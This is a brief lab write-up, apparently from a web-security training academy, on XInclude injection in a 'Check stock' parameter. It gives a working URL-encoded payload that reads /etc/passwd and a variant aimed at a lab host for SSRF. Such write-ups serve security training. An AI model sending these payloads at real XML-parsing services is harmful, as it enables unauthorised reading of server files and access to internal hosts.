# Lab: Exploiting XInclude to retrieve files

Description:  This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.
 Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.
 To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.
End goal : LFI (/etc/passwd)

Analysis :

- using special chars to detect anaomolies
  - productId=1!@#$%^*()_+}{|":';/.,&storeId=1 -> "Entities are not allowed for security reasons"
  - productId=1<testing>lol</testing>&storeId=1 -> "Invalid product ID: 1lol"
  - we found our injection point
final payload
-`productId=1<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse="text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1`
and other payload that we might use for SSRF
- `productId=1<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse="text"+href%3d"https%3a//0a55000203fa1027806cd5fd0052008f.web-security-academy.net/"/></foo>&storeId=1`
